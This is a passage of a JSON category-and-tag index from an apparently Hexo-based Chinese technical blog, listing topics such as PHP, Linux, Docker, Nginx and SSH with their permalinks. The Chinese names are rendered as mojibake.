“","slug":"å¹´ç»ˆæ€»ç»“","permalink":"https://www.0x2beace.com/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"},{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.0x2beace.com/categories/%E7%AE%97%E6%B3%95/"},{"name":"ElasticSearch","slug":"ElasticSearch","permalink":"https://www.0x2beace.com/categories/ElasticSearch/"},{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/categories/MQ/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"},{"name":"Mac","slug":"PHP/Mac","permalink":"https://www.0x2beace.com/categories/PHP/Mac/"},{"name":"è®¡ç®—æœºåŸºç¡€","slug":"è®¡ç®—æœºåŸºç¡€","permalink":"https://www.0x2beace.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"},{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"C","slug":"C","permalink":"https://www.0x2beace.com/categories/C/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Mac","slug":"PHP/Laravel/Mac","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/Mac/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"è®¾è®¡æ¨¡å¼","slug":"PHP/è®¾è®¡æ¨¡å¼","permalink":"https://www.0x2beace.com/categories/PHP/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/categories/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"MQ","slug":"PHP/Laravel/MQ","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/MQ/"},{"name":"PHPStorm","slug":"PHP/PHPStorm","permalink":"https://www.0x2beace.com/categories/PHP/PHPStorm/"},{"name":"è®¾è®¡æ¨¡å¼","slug":"PHP/Laravel/è®¾è®¡æ¨¡å¼","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/categories/Jenkins/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/categories/Hexo/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"PHP/Laravel/ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"PHP/ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/categories/PHP/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"name":"Ubuntu","slug":"Linux/Ubuntu","permalink":"https://www.0x2beace.com/categories/Linux/Ubuntu/"},{"name":"Skill","slug":"Mac/Skill","permalink":"https://www.0x2beace.com/categories/Mac/Skill/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Jenkins","slug":"è¿ç»´/Jenkins","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/Jenkins/"},{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"Redis","slug":"PHP/Redis","permalink":"https://www.0x2beace.com/categories/PHP/Redis/"},{"name":"Mac","slug":"Tutorial/Mac","permalink":"https://www.0x2beace.com/categories/Tutorial/Mac/"},{"name":"PHP","slug":"Linux/PHP","permalink":"https://www.0x2beace.com/categories/Linux/PHP/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"},{"name":"Tips","slug":"Tips","permalink":"https://www.0x2beace.com/categories/Tips/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"},{"name":"Mac","slug":"Linux/Mac","permalink":"https://www.0x2beace.com/categories/Linux/Mac/"},{"name":"Docker","slug":"Linux/Docker","permalink":"https://www.0x2beace.com/categories/Linux/Docker/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"},{"name":"ç»ˆç«¯","slug":"ç»ˆç«¯","permalink":"https://www.0x2beace.com/categories/%E7%BB%88%E7%AB%AF/"},{"name":"Tutorial","slug":"Docker/Tutorial","permalink":"https://www.0x2beace.com/categories/Docker/Tutorial/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/categories/Socket-io/"},{"name":"Nginx","slug":"Socket-io/Nginx","permalink":"https://www.0x2beace.com/categories/Socket-io/Nginx/"},{"name":"Skill","slug":"Git/Skill","permalink":"https://www.0x2beace.com/categories/Git/Skill/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"},{"name":"Windows","slug":"Skill/Windows","permalink":"https://www.0x2beace.com/categories/Skill/Windows/"},{"name":"Mac","slug":"Skill/Windows/Mac","permalink":"https://www.0x2beace.com/categories/Skill/Windows/Mac/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/categories/Shell/"},{"name":"Tutorial","slug":"PHP/Tutorial","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"PHP/Tutorial/è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Socket.io","slug":"Node/Socket-io","permalink":"https://www.0x2beace.com/categories/Node/Socket-io/"},{"name":"å‘½ä»¤æ•´ç†","slug":"Linux/å‘½ä»¤æ•´ç†","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Tutorial","slug":"Node/Tutorial","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"Node/Tutorial/è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"},{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Skill","slug":"Tutorial/Skill","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/"},{"name":"GitHub","slug":"Tutorial/Skill/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"},{"name":"å¹´ç»ˆæ€»ç»“","slug":"å¹´ç»ˆæ€»ç»“","permalink":"https://www.0x2beace.com/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"},{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"ElasticSearch","slug":"ElasticSearch","permalink":"https://www.0x2beace.com/tags/ElasticSearch/"},{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"},{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"https://www.0x2beace.com/tags/RabbitMQ/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"è®¡ç®—æœºåŸºç¡€","slug":"è®¡ç®—æœºåŸºç¡€","permalink":"https://www.0x2beace.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"https://www.0x2beace.com/tags/ThinkPHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"C","slug":"C","permalink":"https://www.0x2beace.com/tags/C/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"},{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://www.0x2beace.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"PHPStorm","slug":"PHPStorm","permalink":"https://www.0x2beace.com/tags/PHPStorm/"},{"name":"Centos","slug":"Centos","permalink":"https://www.0x2beace.com/tags/Centos/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/tags/Jenkins/"},{"name":"åŸŸå","slug":"åŸŸå","permalink":"https://www.0x2beace.com/tags/%E5%9F%9F%E5%90%8D/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"},{"name":"CD","slug":"CD","permalink":"https://www.0x2beace.com/tags/CD/"},{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"é¢è¯•","slug":"é¢è¯•","permalink":"https://www.0x2beace.com/tags/%E9%9D%A2%E8%AF%95/"},{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"},{"name":"Composer","slug":"Composer","permalink":"https://www.0x2beace.com/tags/Composer/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"},{"name":"UFW","slug":"UFW","permalink":"https://www.0x2beace.com/tags/UFW/"},{"name":"iptables","slug":"iptables","permalink":"https://www.0x2beace.com/tags/iptables/"},{"name":"Google Search","slug":"Google-Search","permalink":"https://www.0x2beace.com/tags/Google-Search/"},{"name":"æŒä¹…åŒ–","slug":"æŒä¹…åŒ–","permalink":"https://www.0x2beace.com/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"},{"name":"Google Drive","slug":"Google-Drive","permalink":"https://www.0x2beace.com/tags/Google-Drive/"},{"name":"Crontab","slug":"Crontab","permalink":"https://www.0x2beace.com/tags/Crontab/"},{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"çº¿ç¨‹","slug":"çº¿ç¨‹","permalink":"https://www.0x2beace.com/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"MarkDown","slug":"MarkDown","permalink":"https://www.0x2beace.com/tags/MarkDown/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"},{"name":"Socket","slug":"Socket","permalink":"https://www.0x2beace.com/tags/Socket/"},{"name":"PDO","slug":"PDO","permalink":"https://www.0x2beace.com/tags/PDO/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"},{"name":"Terminal","slug":"Terminal","permalink":"https://www.0x2beace.com/tags/Terminal/"},{"name":"Mysqli","slug":"Mysqli","permalink":"https://www.0x2beace.com/tags/Mysqli/"},{"name":"å±€åŸŸç½‘","slug":"å±€åŸŸç½‘","permalink":"https://www.0x2beace.com/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"Postman","slug":"Postman","permalink":"https://www.0x2beace.com/tags/Postman/"},{"name":"JSON","slug":"JSON","permalink":"https://www.0x2beace.com/tags/JSON/"},{"name":"Xdebug","slug":"Xdebug","permalink":"https://www.0x2beace.com/tags/Xdebug/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.0x2beace.com/tags/DevOps/"},{"name":"K8S","slug":"K8S","permalink":"https://www.0x2beace.com/tags/K8S/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"},{"name":"Certbot","slug":"Certbot","permalink":"https://www.0x2beace.com/tags/Certbot/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"},{"name":"ç›‘æ§ç³»ç»Ÿ","slug":"ç›‘æ§ç³»ç»Ÿ","permalink":"https://www.0x2beace.com/tags/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"},{"name":"ç»ˆç«¯","slug":"ç»ˆç«¯","permalink":"https://www.0x2beace.com/tags/%E7%BB%88%E7%AB%AF/"},{"name":"Docker Hub","slug":"Docker-Hub","permalink":"https://www.0x2beace.com/tags/Docker-Hub/"},{"name":"SSH","slug":"SSH","permalink":"https://www.0x2beace.com/tags/SSH/"},{"name":"SSHD","slug":"SSHD","permalink":"https://www.0x2beace.com/tags/SSHD/"},{"name":"GoAccess","slug":"GoAccess","permalink":"https://www.0x2beace.com/tags/GoAccess/"},{"name":"Logs","slug":"Logs","permalink":"https://www.0x2beace.com/tags/Logs/"},{"name":"äº‘","slug":"äº‘","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"},{"name":"Linux Commands","slug":"Linux-Commands","permalink":"https://www.0x2beace.com/tags/Linux-Commands/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"},{"name":"wss","slug":"wss","permalink":"https://www.0x2beace.com/tags/wss/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"},{"name":"WSL","slug":"WSL","permalink":"https://www.0x2beace.com/tags/WSL/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Supervisor","slug":"Supervisor","permalink":"https://www.0x2beace.com/tags/Supervisor/"},{"name":"Hash","slug":"Hash","permalink":"https://www.0x2beace.com/tags/Hash/"},{"name":"Web å®‰å…¨","slug":"Web-å®‰å…¨","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"},{"name":"ssh","slug":"ssh","permalink":"https://www.0x2beace.com/tags/ssh/"},{"name":"PM2","slug":"PM2","permalink":"https://www.0x2beace.com/tags/PM2/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.0x2beace.com/tags/JavaScript/"}]}